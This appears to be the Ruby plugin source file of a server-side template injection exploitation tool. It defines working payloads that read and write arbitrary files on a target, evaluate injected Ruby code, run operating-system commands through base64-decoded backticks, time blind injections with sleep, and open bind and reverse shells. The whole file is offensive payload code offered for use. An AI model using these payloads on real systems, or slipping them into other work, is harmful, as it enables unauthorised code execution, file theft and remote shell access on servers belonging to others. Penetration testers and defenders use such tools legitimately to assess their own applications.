from core.plugin import Plugin
from plugins.languages import bash
from utils import rand


class Ruby(Plugin):
    def language_init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': """'{header}'+""",
                'trailer': """+'{trailer}'""",
                'test_render': f"""({rand.randints[0]}*{rand.randints[1]}).to_s""",
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'write': {
                'call': 'inject',
                'write': """require'base64';File.open('{path}', 'ab+') {{|f| f.write(Base64.urlsafe_decode64('{chunk_b64}')) }}""",
                'truncate': """File.truncate('{path}', 0)"""
            },
            'read': {
                'call': 'evaluate',
                'read': """require'base64';Base64.encode64(File.binread("{path}"))""",
            },
            'md5': {
                'call': 'evaluate',
                'md5': """require'digest';Digest::MD5.file("{path}")"""
            },
            'evaluate': {
                'evaluate': """({code}).to_s""",
                'call': 'render',
                'test_os': """RUBY_PLATFORM""",
                'test_os_expected': r'^[\w._-]+$'
            },
            'execute': {
                'call': 'evaluate',
                'execute': """require'base64';%x(#{{Base64.urlsafe_decode64('{code_b64}')}})""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'blind': {
                'call': 'evaluate_blind',
                'test_bool_true': """1.to_s=='1'""",
                'test_bool_false': """1.to_s=='2'"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """require'base64';eval(Base64.urlsafe_decode64('{code_b64}'))&&sleep({delay})"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """require'base64';%x(#{{Base64.urlsafe_decode64('{code_b64}')+' && sleep {delay}'}})"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
        ])

    language = 'ruby'
